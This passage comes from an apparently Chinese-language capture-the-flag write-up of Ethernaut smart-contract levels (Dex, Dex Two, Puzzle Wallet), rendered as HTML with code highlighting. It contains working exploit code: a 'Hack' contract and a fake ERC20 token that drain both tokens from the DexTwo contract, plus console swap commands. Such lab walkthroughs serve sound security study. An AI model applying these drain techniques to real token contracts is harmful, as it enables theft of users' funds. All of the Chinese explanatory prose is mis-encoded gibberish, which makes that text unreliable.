<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">dex</span><span class="p">.</span><span class="nx">getSwapPrice</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span><span class="w"> </span><span class="nx">token1</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span><span class="w"> </span><span class="nx">instance</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nx">amount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span><span class="w"> </span><span class="nx">instance</span><span class="p">);</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">                </span><span class="nx">dex</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">                </span><span class="nx">dex</span><span class="p">.</span><span class="nx">swap</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span><span class="w"> </span><span class="nx">token1</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
</li>
<li>
<p>‰∏çÂ∫î‰ªéÂçï‰∏™Êù•Ê∫êËé∑Âèñ‰ª∑Ê†ºÊàñÂÖ∂ÂÆÉÊï∞ÊçÆÔºåÂèØ‰ª•ÂÄüÂä©‰∫é OraclesÔºåÂ¶Ç <a href="https://docs.chain.link/docs/get-the-latest-price">Chainlink Data Feeds</a></p>
</li>
</ul>
<h2 id="23-dex-two">23. Dex Two<a class="headerlink" href="#23-dex-two" title="Permanent link">&para;</a></h2>
<ul>
<li>Ê∏ÖÁ©∫ <code>DexTwo</code> ÂêàÁ∫¶‰∏≠ÁöÑÊâÄÊúâ‰ª£Â∏Å</li>
<li>ÂêàÁ∫¶ <code>DexTwo</code> ÊØèÁßç‰ª£Â∏ÅÂàùÂßãÂêÑ 100 ÊûöÔºåÁé©ÂÆ∂ÊØèÁßç‰ª£Â∏ÅÂàùÂßãÂêÑ 10 Êûö</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="k">import</span><span class="w"> </span><span class="s2">&quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;</span><span class="p">;</span>
<span class="k">import</span><span class="w"> </span><span class="s2">&quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;</span><span class="p">;</span>
<span class="k">import</span><span class="w"> </span><span class="s1">&#39;openzeppelin-contracts-08/access/Ownable.sol&#39;</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">DexTwo</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Ownable</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">token1</span><span class="p">;</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">token2</span><span class="p">;</span>
<span class="w">  </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">setTokens</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_token1</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">_token2</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">token1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_token1</span><span class="p">;</span>
<span class="w">    </span><span class="nx">token2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_token2</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">add_liquidity</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">token_address</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">token_address</span><span class="p">).</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">swap</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="kr">from</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">IERC20</span><span class="p">(</span><span class="kr">from</span><span class="p">).</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Not enough to swap&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">uint</span><span class="w"> </span><span class="nx">swapAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getSwapAmount</span><span class="p">(</span><span class="kr">from</span><span class="p">,</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">    </span><span class="nx">IERC20</span><span class="p">(</span><span class="kr">from</span><span class="p">).</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">    </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">to</span><span class="p">).</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">swapAmount</span><span class="p">);</span>
<span class="w">    </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">to</span><span class="p">).</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">swapAmount</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span><span class="w"> </span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">getSwapAmount</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="kr">from</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="p">(</span><span class="nx">uint</span><span class="p">){</span>
<span class="w">    </span><span class="k">return</span><span class="p">((</span><span class="nx">amount</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">to</span><span class="p">).</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)))</span><span class="o">/</span><span class="nx">IERC20</span><span class="p">(</span><span class="kr">from</span><span class="p">).</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">spender</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">SwappableTokenTwo</span><span class="p">(</span><span class="nx">token1</span><span class="p">).</span><span class="nx">approve</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">spender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">    </span><span class="nx">SwappableTokenTwo</span><span class="p">(</span><span class="nx">token2</span><span class="p">).</span><span class="nx">approve</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">spender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">token</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">account</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="p">){</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">token</span><span class="p">).</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">account</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">SwappableTokenTwo</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">ERC20</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">_dex</span><span class="p">;</span>
<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">dexInstance</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">symbol</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">initialSupply</span><span class="p">)</span><span class="w"> </span><span class="nx">ERC20</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">symbol</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">_mint</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">initialSupply</span><span class="p">);</span>
<span class="w">        </span><span class="nx">_dex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dexInstance</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">spender</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">owner</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">_dex</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;InvalidApprover&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="k">super</span><span class="p">.</span><span class="nx">_approve</span><span class="p">(</span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="nx">spender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>
<p>Áõ∏ÊØîÂêàÁ∫¶ <code>Dex</code>ÔºåÂêàÁ∫¶ <code>DexTwo</code> Âú®ËøõË°åË¥ßÂ∏Å‰∫§Êç¢Êó∂‰∏çÂÜçÊ£ÄÊü•ËæìÂÖ•ÂèÇÊï∞ <code>from</code>„ÄÅ<code>to</code>ÔºåÂõ†Ê≠§ÂèØ‰ª•ÂÄüÂä©ÂÖ∂ÂÆÉ‰ª£Â∏ÅÊù•Ê∏ÖÁ©∫ <code>DexTwo</code> ‰∏≠ÁöÑ <code>token1</code> Âíå <code>token2</code></p>
<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">tokens</span><span class="p">;</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">DexTwo</span><span class="w"> </span><span class="nx">dex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">DexTwo</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
<span class="w">    </span><span class="nx">tokens</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">dex</span><span class="p">.</span><span class="nx">token1</span><span class="p">());</span>
<span class="w">    </span><span class="nx">tokens</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">dex</span><span class="p">.</span><span class="nx">token2</span><span class="p">());</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint8</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">SwappableTokenTwo</span><span class="w"> </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">SwappableTokenTwo</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;fake&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;F&quot;</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="p">);</span>
<span class="w">      </span><span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mf">1</span><span class="p">);</span>
<span class="w">      </span><span class="nx">token</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mf">1</span><span class="p">);</span>
<span class="w">      </span><span class="nx">dex</span><span class="p">.</span><span class="nx">swap</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">),</span><span class="w"> </span><span class="nx">tokens</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span><span class="w"> </span><span class="mf">1</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
</li>
<li>
<p>Â£∞ÊòéÂÆûÁé∞‰∫Ü ERC20 Ê†áÂáÜÁöÑÂêàÁ∫¶‰∏ç‰∏ÄÂÆöÂèØ‰ø°ÔºåÈÉ®ÂàÜÂêàÁ∫¶ÁöÑ<a href="https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca">ÂáΩÊï∞ËøîÂõûÂÄºÂèØËÉΩÁº∫Â§±</a>Ôºå‰πüÂèØËÉΩÂ≠òÂú®ÊÅ∂ÊÑèË°å‰∏∫</p>
</li>
<li>
<p>Êõ¥ÁÆÄÂçïÂú∞ÔºåÂèØ‰ª•ÈÉ®ÁΩ≤‰∏Ä‰∏™ÊÅ∂ÊÑèÁöÑ ERC20 ÂêàÁ∫¶</p>
<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">DexTwoAttackToken</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">pure</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">pure</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">swap</span><span class="p">(</span><span class="s2">&quot;&lt;DexTwoAttackTokenAddress&gt;&quot;</span><span class="p">,</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">token1</span><span class="p">(),</span><span class="w"> </span><span class="mf">1</span><span class="p">)</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">swap</span><span class="p">(</span><span class="s2">&quot;&lt;DexTwoAttackTokenAddress&gt;&quot;</span><span class="p">,</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">token2</span><span class="p">(),</span><span class="w"> </span><span class="mf">1</span><span class="p">)</span>
</code></pre></div>
</li>
</ul>
<h2 id="24-puzzle-wallet">24. Puzzle Wallet<a class="headerlink" href="#24-puzzle-wallet" title="Permanent link">&para;</a></h2>
<p>Êàê‰∏∫‰ª£ÁêÜÂêàÁ∫¶ÁöÑÁÆ°ÁêÜÂëò</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">experimental</span><span class="w"> </span><span class="nx">ABIEncoderV2</span><span class="p">;</span><span class="w"> </span><span class="c1">// redundant</span>

<span class="k">import</span><span class="w"> </span><span class="s2">&quot;../helpers/UpgradeableProxy-08.sol&quot;</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">PuzzleProxy</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">UpgradeableProxy</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">pendingAdmin</span><span class="p">;</span>
<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">admin</span><span class="p">;</span>

<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_admin</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">_implementation</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">_initData</span><span class="p">)</span><span class="w"> </span><span class="nx">UpgradeableProxy</span><span class="p">(</span><span class="nx">_implementation</span><span class="p">,</span><span class="w"> </span><span class="nx">_initData</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">admin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_admin</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">onlyAdmin</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">admin</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Caller is not the admin&quot;</span><span class="p">);</span>
<span class="w">      </span><span class="nx">_</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">proposeNewAdmin</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_newAdmin</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">pendingAdmin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_newAdmin</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">approveNewAdmin</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_expectedAdmin</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">onlyAdmin</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">pendingAdmin</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">_expectedAdmin</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Expected new admin by the current admin is not the pending admin&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">admin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">pendingAdmin</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">upgradeTo</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_newImplementation</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">onlyAdmin</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">_upgradeTo</span><span class="p">(</span><span class="nx">_newImplementation</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">PuzzleWallet</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">owner</span><span class="p">;</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">maxBalance</span><span class="p">;</span>
<span class="w">    </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">whitelisted</span><span class="p">;</span>
<span class="w">    </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">balances</span><span class="p">;</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">init</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">_maxBalance</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">maxBalance</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Already initialized&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">maxBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_maxBalance</span><span class="p">;</span>
<span class="w">        </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">onlyWhitelisted</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">whitelisted</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">],</span><span class="w"> </span><span class="s2">&quot;Not whitelisted&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">_</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setMaxBalance</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">_maxBalance</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">onlyWhitelisted</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">require</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Contract balance is not 0&quot;</span><span class="p">);</span>
<span class="w">      </span><span class="nx">maxBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_maxBalance</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">addToWhitelist</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">addr</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Not the owner&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">whitelisted</span><span class="p">[</span><span class="nx">addr</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">deposit</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">onlyWhitelisted</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">require</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="nx">maxBalance</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Max balance reached&quot;</span><span class="p">);</span>
<span class="w">      </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">execute</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">value</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">onlyWhitelisted</span><span class="w"> </span><span class="p">{</span>
